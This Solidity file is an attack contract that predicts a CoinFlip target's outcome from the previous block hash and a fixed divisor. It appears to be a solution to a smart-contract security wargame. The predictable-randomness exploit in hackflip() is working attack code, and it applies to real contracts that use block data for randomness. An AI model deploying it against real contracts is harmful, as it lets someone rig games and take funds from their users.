pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Hack {
    CoinFlip coinFlipContract;
    uint coinNum;

    constructor(address _target) {
        coinFlipContract = CoinFlip(_target);
    }

    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function showCoinNum() public view returns(uint) {
        return coinNum;
    }
    function hackflip() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    coinNum = blockValue / FACTOR;
    bool side = coinNum == 1 ? true : false;

    if (side) {
        coinFlipContract.flip(side);
    }

    }


}